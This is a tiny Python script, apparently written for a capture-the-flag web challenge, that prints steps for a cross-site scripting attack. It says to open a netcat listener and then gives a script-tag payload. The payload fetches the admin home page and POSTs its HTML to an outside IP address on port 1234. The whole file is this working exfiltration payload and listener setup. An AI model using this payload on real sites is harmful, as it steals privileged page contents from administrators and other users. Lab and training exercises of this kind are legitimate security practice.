#!/usr/bin/python3

print('''
Here first run 'nc -nvlp 1234'
then run the ./exploit.py
then this will read the page of admin home page and send that page into my nc server
here i use payload in url encoded form
payload :- <script>fetch('http://challenge.localhost/').then(r=>r.text()).then(html=>{fetch('http://10.50.173.77:1234/',{method:"POST",body:html})})</script>


''')
